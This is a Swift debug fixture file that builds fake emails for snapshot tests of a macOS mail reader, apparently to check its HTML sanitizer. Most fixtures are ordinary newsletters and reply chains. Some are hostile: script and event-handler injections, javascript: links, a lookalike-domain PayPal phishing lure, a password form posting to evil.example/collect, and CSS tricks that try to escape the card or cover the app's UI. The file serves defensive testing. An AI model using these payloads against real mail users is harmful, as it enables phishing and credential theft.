#if DEBUG
import AppKit
import TernCore

/// Hand-written hard cases for the snapshot harness, added to an in-memory fake mailbox.
enum ReaderSnapshotFixtures {
    static let account = FakeMailbox.accounts[1]
    static var me: Participant { Participant(name: FakeMailbox.me, email: account.email) }
    static let maya = Participant(name: "Maya Chen", email: "maya@lumen.io")
    static let jonas = Participant(name: "Jonas Weber", email: "jonas@kiteworks.dev")

    struct Fixture {
        var name: String
        var key: ThreadKey
        var width: CGFloat = 760
    }

    static func install(into store: MailStore, now: Date) throws -> [Fixture] {
        var fixtures: [Fixture] = []
        var messages: [MailMessage] = []
        var attachments: [MailAttachment] = []
        var ai: [ThreadAI] = []
        func message(
            _ id: String, thread: String, from: Participant, to: [Participant], subject: String, minutesAgo: Double,
            html: String? = nil, text: String? = nil, unread: Bool = false, labels: [String] = ["INBOX"], cc: [Participant] = []
        ) {
            var labelIds = labels
            if unread { labelIds.append(SystemLabel.unread) }
            if from.email == account.email { labelIds = labelIds.filter { $0 != "INBOX" } + [SystemLabel.sent] }
            messages.append(MailMessage(
                accountId: account.id, id: id, threadId: thread, date: now.addingTimeInterval(-minutesAgo * 60),
                fromName: from.name, fromEmail: from.email, toList: to, ccList: cc, subject: subject,
                snippet: String((text ?? html?.replacingOccurrences(of: "<[^>]+>", with: " ", options: .regularExpression) ?? "")
                    .split(whereSeparator: \.isWhitespace).joined(separator: " ").prefix(140)),
                bodyText: text, bodyHtml: html, bodyState: .full, labelIds: labelIds,
                isFromMe: from.email == account.email, rfcMessageId: "<\(id)@fixture>"))
        }
        func key(_ thread: String) -> ThreadKey { ThreadKey(accountId: account.id, threadId: thread) }

        // A table-layout newsletter with a fixed 640 px width, a hero image, two columns and a tracking pixel.
        message("fx-news", thread: "fx-news", from: Participant(name: "The Weekly Build", email: "hello@weeklybuild.example"),
                to: [me], subject: "Issue 142: Shipping faster with smaller pull requests", minutesAgo: 95, html: newsletter, unread: true,
                labels: ["INBOX", "CATEGORY_UPDATES"])
        ai.append(ThreadAI(accountId: account.id, threadId: "fx-news", category: .newsletter, messageCount: 1))
        fixtures.append(Fixture(name: "newsletter", key: key("fx-news")))
        fixtures.append(Fixture(name: "newsletter-narrow", key: key("fx-news"), width: 520))

        // Hostile mail: scripts, handlers, an iframe, a form, a fixed overlay and a phishing link.
        message("fx-evil", thread: "fx-evil", from: Participant(name: "PayPal Security", email: "security@paypa1-alerts.example"),
                to: [me], subject: "Action required: verify your account", minutesAgo: 30, html: hostile, unread: true)
        ai.append(ThreadAI(accountId: account.id, threadId: "fx-evil", category: .security, messageCount: 1))
        fixtures.append(Fixture(name: "hostile", key: key("fx-evil")))

        // A newsletter far over the inline sanitize limit: the header paints first, the body follows.
        message("fx-big", thread: "fx-big", from: Participant(name: "The Long Read", email: "digest@longread.example"),
                to: [me], subject: "Everything that happened this month", minutesAgo: 40, html: bigNewsletter, unread: true,
                labels: ["INBOX", "CATEGORY_UPDATES"])
        fixtures.append(Fixture(name: "big-newsletter", key: key("fx-big")))

        // Mail that tries to draw over the reader's own header with offsets, margins and transforms.
        message("fx-overlay", thread: "fx-overlay", from: Participant(name: "Account Team", email: "team@overlay.example"),
                to: [me], subject: "Your statement is ready", minutesAgo: 35, html: overlay, unread: true)
        fixtures.append(Fixture(name: "overlay", key: key("fx-overlay")))

        // A reply chain: Gmail, Outlook and Apple Mail quoting each other.
        message("fx-chain-1", thread: "fx-chain", from: maya, to: [me, jonas], subject: "Contract for the Lumen redesign", minutesAgo: 4_400,
                html: "<div dir=\"ltr\">Hi Alex,<div><br></div><div>Attaching the first draft of the statement of work for the redesign. The big open question is the payment schedule.</div><div><br></div><div>Maya</div></div>")
        message("fx-chain-2", thread: "fx-chain", from: me, to: [maya], subject: "Re: Contract for the Lumen redesign", minutesAgo: 3_000,
                html: "<div dir=\"ltr\">Thanks Maya, two notes on the payment terms before I send it to legal: could we do 40/30/30, and move the first milestone to mid-November?</div><br><div class=\"gmail_quote\"><div dir=\"ltr\" class=\"gmail_attr\">On Mon, Oct 12, 2026 at 9:14 AM Maya Chen &lt;maya@lumen.io&gt; wrote:<br></div><blockquote class=\"gmail_quote\" style=\"margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex\"><div dir=\"ltr\">Hi Alex,<div>Attaching the first draft…</div></div></blockquote></div>",
                cc: [jonas])
        message("fx-chain-3", thread: "fx-chain", from: jonas, to: [me, maya], subject: "RE: Contract for the Lumen redesign", minutesAgo: 1_500,
                html: "<div class=\"WordSection1\"><p class=\"MsoNormal\">Legal is fine with 40/30/30. One small change in §4: the acceptance window should be 10 business days, not 5.<o:p></o:p></p><p class=\"MsoNormal\">Jonas<o:p></o:p></p><div id=\"appendonsend\"></div><hr style=\"display:inline-block;width:98%\" tabindex=\"-1\"><div id=\"divRplyFwdMsg\" dir=\"ltr\"><font face=\"Calibri, sans-serif\" style=\"font-size:11pt\" color=\"#000000\"><b>From:</b> Alex Morgan<br><b>Sent:</b> Tuesday, October 13, 2026 2:02 PM<br><b>Subject:</b> Re: Contract for the Lumen redesign</font></div><div><p>Thanks Maya, two notes on the payment terms…</p></div></div>")
        message("fx-chain-4", thread: "fx-chain", from: maya, to: [me], subject: "Re: Contract for the Lumen redesign", minutesAgo: 14,
                html: """
                <div dir="ltr"><div>Hi Alex,</div><div><br></div><div>Updated version attached. I took both of your notes: the schedule is now 40/30/30, and the first milestone moves to <b>November 14</b> so the team has room for the user tests. Jonas's change to §4 is in too.</div><div><br></div><div>Could you sign before Thursday? Legal wants it in before the kickoff, and Daniel already booked the room for 9:30. The signing link is <a href="https://sign.lumen.io/sow/v3">sign.lumen.io/sow/v3</a>.</div><div><br></div><div>Thanks,</div><div>Maya</div><div><br></div><div class="gmail_signature" data-smartmail="gmail_signature">Maya Chen · Producer, Lumen<br>+1 415 555 0142</div></div><br>
                <div class="gmail_quote"><div class="gmail_attr">On Wed, Oct 14, 2026 at 4:10 PM Jonas Weber &lt;jonas@kiteworks.dev&gt; wrote:<br></div><blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">Legal is fine with 40/30/30.<blockquote type="cite">On Oct 13, Alex wrote:<br>Thanks Maya, two notes…</blockquote></blockquote></div>
                """, unread: true, labels: ["INBOX", "Label_clients"])
        attachments.append(MailAttachment(accountId: account.id, messageId: "fx-chain-4", partId: "2", attachmentId: "a1",
                                          filename: "Lumen — SOW v3.pdf", mimeType: "application/pdf", size: 482_113))
        ai.append(ThreadAI(accountId: account.id, threadId: "fx-chain", category: .people, needsReply: true, priority: 2,
                           summary: "Maya needs your sign-off on the SOW before Thursday; the schedule is now 40/30/30 and the first milestone moves to Nov 14.",
                           messageCount: 4))
        fixtures.append(Fixture(name: "reply-chain", key: key("fx-chain")))
        // Full width over the list: the column stays 720 pt and centred.
        fixtures.append(Fixture(name: "reply-chain-wide", key: key("fx-chain"), width: 1_180))

        // Plain text with a quote, links and a signature.
        message("fx-plain", thread: "fx-plain", from: Participant(name: "Priya Raman", email: "priya@brightpath.co"), to: [me],
                subject: "Notes from the Q4 roadmap call", minutesAgo: 240, text: """
                Hi Alex,

                Here's the summary from the call: scope stays, the timeline moves by a week, and we
                drop the CSV export from v1. Recording: https://meet.example.com/rec/8841 (passcode 5521).

                Open items:
                - Jonas checks the sync edge cases
                - you confirm the launch date with Lumen

                Docs are in www.brightpath.co/roadmap — ping me at priya@brightpath.co if you can't get in.

                --\u{20}
                Priya Raman
                Head of Product, Brightpath

                On Tue, Oct 13, 2026 at 5:01 PM Alex Morgan <alex@northwind.studio> wrote:
                > Can you send notes after the call?
                > Thanks!
                """)
        fixtures.append(Fixture(name: "plain-text", key: key("fx-plain")))

        // An inline cid: image and two ordinary attachments.
        message("fx-cid", thread: "fx-cid", from: jonas, to: [me], subject: "Q4 budget, chart inline", minutesAgo: 600, html: """
            <p>Here's the Q4 budget split. Chart below, spreadsheet attached.</p><p><img src="cid:chart@kiteworks" width="420" alt="Budget chart"></p>
            <p>The marketing line is the one to watch.</p><p>— Jonas</p>
            """)
        attachments += [
            MailAttachment(accountId: account.id, messageId: "fx-cid", partId: "2", attachmentId: "c1", filename: "chart.png",
                           mimeType: "image/png", size: 38_212, contentId: "chart@kiteworks", isInline: true),
            MailAttachment(accountId: account.id, messageId: "fx-cid", partId: "3", attachmentId: "c2", filename: "Budget Q4.xlsx",
                           mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", size: 88_210),
            MailAttachment(accountId: account.id, messageId: "fx-cid", partId: "4", attachmentId: "c3", filename: "Screenshot 2026-10-02.png",
                           mimeType: "image/png", size: 1_204_551),
        ]
        fixtures.append(Fixture(name: "cid-image", key: key("fx-cid")))

        // A long thread: collapsed runs fold into "N more".
        for index in 0..<9 {
            let from = index.isMultiple(of: 2) ? jonas : me
            message("fx-long-\(index)", thread: "fx-long", from: from, to: [from == me ? jonas : me], subject: index == 0 ? "Sync engine edge cases" : "Re: Sync engine edge cases",
                    minutesAgo: Double(9 - index) * 300,
                    html: "<div>\(["Found another one: label changes during backfill.", "Does it reproduce on a fresh account?", "Yes, every time the history id is older than a week.", "Then we should fall back to a full sync.", "Agreed. I'll write it up.", "Draft is in the doc.", "Left two comments.", "Fixed both.", "Ship it on Monday? I can watch the error rates over the weekend if that helps."][index])</div>",
                    unread: index == 8)
        }
        fixtures.append(Fixture(name: "long-thread", key: key("fx-long")))

        // A simple Gmail mail with its own dark text and link colors.
        message("fx-simple", thread: "fx-simple", from: Participant(name: "Mom", email: "linda.morgan@gmail.com"), to: [me],
                subject: "Photos from the weekend", minutesAgo: 1_000, html: """
                <div dir="ltr"><div style="font-family:arial,sans-serif;color:rgb(34,34,34)">Here they are! The one by the lake is my favorite, can you print it for Grandma?</div><div style="color:#222222"><br></div><div><font color="#1155cc">Album link</font>: <a href="https://photos.app.goo.gl/x8Kd2">https://photos.app.goo.gl/x8Kd2</a></div><div style="color:#cc0000">Don't forget Sunday dinner at 6.</div><div><br></div><div style="color:#888888">Sent from my iPad</div></div>
                """)
        fixtures.append(Fixture(name: "simple-colored", key: key("fx-simple")))

        // Remote images from a local test server (the run script starts it on port 18766).
        message("fx-remote", thread: "fx-remote", from: Participant(name: "Local Images", email: "news@images.test"), to: [me],
                subject: "Remote images from a local server", minutesAgo: 50, html: """
                <p>Two remote images and a tracking pixel, served from 127.0.0.1.</p>
                <p><img src="http://127.0.0.1:18766/hero.png" width="320" height="120" alt="Hero image"></p>
                <div style="background: #ffffff url(http://127.0.0.1:18766/background.png); width: 320px; height: 40px">CSS background</div>
                <img src="http://127.0.0.1:18766/pixel.png" width="1" height="1" alt="">
                """)
        fixtures.append(Fixture(name: "remote-images", key: key("fx-remote")))

        // A rich mail that also styles itself for dark mode: on the light card it must still read as light.
        message("fx-dark-css", thread: "fx-dark-css", from: Participant(name: "Storage Team", email: "reports@storage.example"),
                to: [me], subject: "Your monthly storage report", minutesAgo: 55, html: darkModeCSS, unread: true)
        fixtures.append(Fixture(name: "dark-mode-css", key: key("fx-dark-css")))
        message("fx-dark-sheet", thread: "fx-dark-sheet", from: Participant(name: "Storage Team", email: "reports@storage.example"),
                to: [me], subject: "Your invoice is ready", minutesAgo: 56, html: darkModeSheet)
        fixtures.append(Fixture(name: "dark-mode-sheet", key: key("fx-dark-sheet")))

        // Mail CSS that hides `{`, `}` and comment starts behind combining marks or in strings that run past their
        // line, to reach the shadow host and lift the card's containment.
        message("fx-css-escape", thread: "fx-css-escape", from: Participant(name: "Account Notices", email: "notices@account-alerts.example"),
                to: [me], subject: "Your statement is available", minutesAgo: 57, html: cssEscape)
        fixtures.append(Fixture(name: "css-escape", key: key("fx-css-escape")))

        try store.upsertMessages(messages, attachments: attachments)
        try store.database.writer.write { db in for item in ai { try item.upsert(db) } }
        try store.setProject("proj-lumen", on: [key("fx-chain")], assigned: true)
        _ = try store.perform(.snooze(until: now.addingTimeInterval(20 * 3_600)), on: [key("fx-cid")])
        return fixtures
    }

    /// A stand-in sender logo: a letter on a colour, as PNG.
    static func logo(_ letter: String, _ color: UInt32) -> Data {
        let size = NSSize(width: 64, height: 64)
        let image = NSImage(size: size, flipped: false) { rect in
            Theme.rgb(color).setFill()
            rect.fill()
            let text = NSAttributedString(string: letter, attributes: [
                .font: NSFont.systemFont(ofSize: 34, weight: .bold), .foregroundColor: NSColor.white,
            ])
            let bounds = text.size()
            text.draw(at: NSPoint(x: (rect.width - bounds.width) / 2, y: (rect.height - bounds.height) / 2))
            return true
        }
        guard let tiff = image.tiffRepresentation, let rep = NSBitmapImageRep(data: tiff),
              let png = rep.representation(using: .png, properties: [:]) else { return Data() }
        return png
    }

    /// A PNG bar chart standing in for the downloaded inline image.
    static func chartImage() -> Data {
        let size = NSSize(width: 840, height: 420)
        let image = NSImage(size: size, flipped: false) { rect in
            NSColor(srgbRed: 0.97, green: 0.97, blue: 0.96, alpha: 1).setFill()
            NSBezierPath(roundedRect: rect, xRadius: 16, yRadius: 16).fill()
            let values: [CGFloat] = [0.42, 0.8, 0.55, 0.3, 0.66]
            let colors: [UInt32] = [0x2F6FD8, 0xE5461E, 0x23764A, 0x8A6FB3, 0xC08A3E]
            for (index, value) in values.enumerated() {
                Theme.rgb(colors[index]).setFill()
                NSBezierPath(roundedRect: NSRect(x: 80 + CGFloat(index) * 140, y: 60, width: 90, height: 300 * value), xRadius: 8, yRadius: 8).fill()
            }
            return true
        }
        guard let tiff = image.tiffRepresentation, let rep = NSBitmapImageRep(data: tiff),
              let png = rep.representation(using: .png, properties: [:]) else { return Data() }
        return png
    }

    static let newsletter = """
        <html><head><style>
        body { margin:0; background:#eef1f5; } .wrap { width:640px; }
        @media screen and (max-width: 480px) { .col { display:block !important; width:100% !important; } }
        @import url("https://fonts.example.com/inter.css");
        </style></head>
        <body bgcolor="#eef1f5"><table width="100%" bgcolor="#eef1f5" cellpadding="0" cellspacing="0" role="presentation"><tr><td align="center" style="padding:24px 0">
        <table class="wrap" width="640" cellpadding="0" cellspacing="0" style="background:#ffffff;border-radius:10px">
        <tr><td style="padding:28px 40px 10px;font:700 12px Helvetica,Arial,sans-serif;letter-spacing:.12em;color:#5b4bdb;text-transform:uppercase">The Weekly Build · Issue 142</td></tr>
        <tr><td style="padding:0 40px 18px;font:700 28px/1.25 Georgia,serif;color:#1c1b19">Shipping faster with smaller pull requests</td></tr>
        <tr><td><img src="https://images.weeklybuild.example/hero-142.jpg" width="640" height="260" alt="A tidy stack of small pull requests" style="display:block;border:0"></td></tr>
        <tr><td style="padding:24px 40px 8px;font:16px/1.6 Georgia,serif;color:#33302b">
        <p style="margin:0 0 14px">Teams that keep pull requests under 200 lines merge twice as fast and revert half as often. This week we look at how three teams got there without slowing review.</p>
        <p style="margin:0 0 14px">The common thread: they split work by behaviour, not by layer, and they let reviewers ask for a smaller change without it feeling like a rejection.</p></td></tr>
        <tr><td style="padding:8px 40px 24px"><table width="560" cellpadding="0" cellspacing="0" role="presentation"><tr>
        <td class="col" width="270" valign="top" style="font:14px/1.5 Helvetica,Arial,sans-serif;color:#33302b"><img src="https://images.weeklybuild.example/a.jpg" width="270" height="150" alt="Stacked diffs" style="display:block;border-radius:6px"><p style="margin:10px 0 0"><b>Stacked diffs</b> keep each change reviewable on its own.</p></td>
        <td width="20"></td>
        <td class="col" width="270" valign="top" style="font:14px/1.5 Helvetica,Arial,sans-serif;color:#33302b"><img src="https://images.weeklybuild.example/b.jpg" width="270" height="150" alt="Review budgets" style="display:block;border-radius:6px"><p style="margin:10px 0 0"><b>Review budgets</b> cap how long a change can wait.</p></td>
        </tr></table></td></tr>
        <tr><td style="padding:0 40px 32px"><a href="https://weeklybuild.example/142?utm_source=email" style="display:inline-block;background:#5b4bdb;color:#ffffff;padding:12px 22px;border-radius:6px;font:600 14px Helvetica,Arial,sans-serif;text-decoration:none">Read the full issue</a></td></tr>
        </table>
        <p style="font:12px/1.5 Helvetica,Arial,sans-serif;color:#8a8f98;margin:16px 0 0">You're receiving this because you subscribed at weeklybuild.example. <a href="https://weeklybuild.example/unsubscribe" style="color:#8a8f98">Unsubscribe</a></p>
        <img src="https://t.weeklybuild.example/open?id=8812" width="1" height="1" alt="">
        </td></tr></table></body></html>
        """

    /// Light tables painted inline, plus the ways mail asks for dark mode: `color-scheme` on the root, the meta
    /// tags and `prefers-color-scheme` blocks in several spellings.
    static let darkModeCSS = """
        <html><head>
        <meta name="color-scheme" content="light dark"><meta name="supported-color-schemes" content="light dark">
        <style>
        :root { color-scheme: light dark; supported-color-schemes: light dark; }
        body { margin: 0; background-color: #f4f4f5; font: 15px/1.6 Helvetica, Arial, sans-serif; color: #3f3f46; }
        h1 { color: #18181b; } .note { color: #71717a; } .light-only { display: none; }
        @media (prefers-color-scheme: light) { .light-only { display: block !important; } }
        @media screen and (prefers-color-scheme:DARK) { .note { color: #FFF !important; } }
        @MEDIA (PREFERS-COLOR-SCHEME: DARK) {
          body, .email-body { background-color: #333 !important; color: #FFF !important; }
          p, h1, span, td { color: #FFF !important; }
        }
        @supports (display: grid) { @media (prefers-color-scheme: dark) { h1 { color: #fafafa !important; } } }
        </style>
        </head>
        <body class="email-body" bgcolor="#f4f4f5">
        <table width="100%" bgcolor="#f4f4f5" cellpadding="0" cellspacing="0" role="presentation"><tr><td align="center" style="padding:32px 16px">
        <table class="card" width="520" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px">
        <tr><td style="padding:32px 40px 8px"><h1 style="margin:0;font:600 22px/1.3 Helvetica,Arial,sans-serif">Your monthly storage report</h1></td></tr>
        <tr><td style="padding:8px 40px"><p style="margin:0">The workspace <b>design-archive</b> used <b>82%</b> of its storage this month. Exports older than a year move to cold storage on the 1st.</p></td></tr>
        <tr><td style="padding:8px 40px"><p class="light-only" style="margin:0">Tip: archived exports can be restored at any time from the dashboard.</p></td></tr>
        <tr class="cta"><td style="padding:16px 40px"><a href="https://storage.example/report" style="display:inline-block;background:#0f766e;color:#ffffff;padding:10px 20px;border-radius:6px;text-decoration:none;font-weight:600">Review storage</a></td></tr>
        <tr><td style="padding:8px 40px 32px"><span class="note">Questions? Reply to this mail and the team will help.</span></td></tr>
        </table></td></tr></table></body></html>
        """

    /// A whole style sheet for dark mode only, through `<style media>`.
    static let darkModeSheet = """
        <html><head>
        <style media="screen">.total { font-weight: 600; }</style>
        <style media="(prefers-color-scheme: dark)">.card { background-color: #27272a !important; } td { color: #ffffff !important; }</style>
        </head><body bgcolor="#eef2f6">
        <table width="100%" bgcolor="#eef2f6" cellpadding="0" cellspacing="0" role="presentation"><tr><td align="center" style="padding:28px 16px">
        <table class="card" width="480" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;font:15px/1.6 Helvetica,Arial,sans-serif;color:#334155">
        <tr><td style="padding:28px 36px 4px;font-size:20px;font-weight:600;color:#0f172a">Invoice INV-2048</td></tr>
        <tr><td style="padding:4px 36px">Storage, October · 1.2 TB</td></tr>
        <tr><td class="total" style="padding:4px 36px 28px">Total due: $24.00</td></tr>
        </table></td></tr></table></body></html>
        """

    /// `ReaderSnapshot.checkCSSEscape` reads the card's containment and the reader's own text width after this
    /// renders. The `@font-face` rules would re-glyph Tern's Inter text (all of it, or just `W`) if they got through.
    static let cssEscape = """
        <html><head>
        <style>@font-face{font-family:Inter;src:local(Zapfino)} @font-face{font-family:"Inter Display";src:local(Zapfino)}
        @font-face{font-family:Inter;src:local("Zapfino");unicode-range:U+0057}</style>
        <style media="all {&#x301;, :host">
        & { contain:none !important; overflow:visible !important; position:absolute !important; inset:0 !important }
        </style>
        <style>p { font-family: Helvetica }\u{301}, :host {\u{301}; contain: none !important; overflow: visible !important }</style>
        <style>.note { content: "a
        } :host { contain: none !important; overflow: visible !important } .x { content: "b" }</style>
        <style>.y /*\u{301} { color: red }
        .z { content: "*/, :host { contain: none !important; overflow: visible !important } x{" }</style>
        </head><body>
        <div style="font:15px/1.6 Helvetica,Arial,sans-serif">
        <p style="margin:0 0 8px;font-weight:600">Your October statement is ready.</p>
        <p class="note" style="margin:0">Sign in to view it. The red panel above this text covers the reader only if mail CSS escapes the card.</p>
        <div style="position:absolute;left:0;top:-400px;width:100%;height:400px;background:#d92d20"></div>
        </div></body></html>
        """

    static let bigNewsletter: String = {
        var html = "<html><body><table width=\"600\" style=\"font:14px/20px Helvetica,Arial,sans-serif;color:#333\">"
        var index = 0
        while html.utf8.count < 800_000 {
            html += "<tr><td style=\"padding:8px 0;border-bottom:1px solid #eee\"><a href=\"https://longread.example/\(index)\" style=\"color:#5b4bdb\">Story \(index + 1): a headline that runs a little long</a>"
                + "<p style=\"margin:4px 0 0\">A two-line summary of the story, long enough to wrap in the reader column.</p></td></tr>"
            index += 1
        }
        return html + "</table></body></html>"
    }()

    static let overlay = """
        <html><head><style>
        html { margin-top: -260px !important } :host { margin-top: -400px !important; position: absolute; top: 0 }
        .cover { position: absolute; top: -170px; left: -60px; width: 900px; height: 150px; background: #c00; color: #fff;
          font: 600 28px Helvetica, sans-serif; padding: 40px; z-index: 2147483647 }
        .lift { transform: translateY(-220px); background: #0a6; color: #fff; padding: 20px; margin-left: -80px }
        </style></head><body>
        <div class="cover">Fake header: “Signed in as you — verify now”</div>
        <p style="margin-top: 300px">The statement body sits here, below what tried to cover the header.</p>
        <div class="lift">This box tried to lift itself over the subject.</div>
        </body></html>
        """

    static let hostile = """
        <div style="font:15px/1.5 Helvetica,Arial,sans-serif;color:#222">
        <p>Dear customer,</p>
        <p>We noticed unusual activity on your account. Please verify your details within 24 hours to avoid suspension.</p>
        <script>document.body.dataset.pwned = "script";</script>
        <img src="x" onerror="document.body.dataset.pwned = 'onerror'" alt="">
        <p><a href="javascript:document.body.dataset.pwned='href'">Verify now</a> · <a href="https://paypa1-secure.example.ru/signin">https://www.paypal.com/signin</a></p>
        <iframe src="https://evil.example/frame" width="400" height="120"></iframe>
        <form action="https://evil.example/collect" method="post"><input type="password" name="pw" placeholder="Password"><button type="submit">Sign in</button></form>
        <div style="position:fixed;top:0;left:0;right:0;padding:8px;background:#c00;color:#fff;z-index:99999">This banner tried to cover the app</div>
        <meta http-equiv="refresh" content="0;url=https://evil.example">
        <svg onload="document.body.dataset.pwned='svg'"><circle r="10"></circle></svg>
        <object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y.swf">
        <a href="https://example.com" onmouseover="document.body.dataset.pwned='hover'">A normal link with a handler</a>
        <p style="color:#777;background:url(javascript:alert(1));width:expression(alert(2))">— PayPal Security Team</p>
        </div>
        """
}
#endif
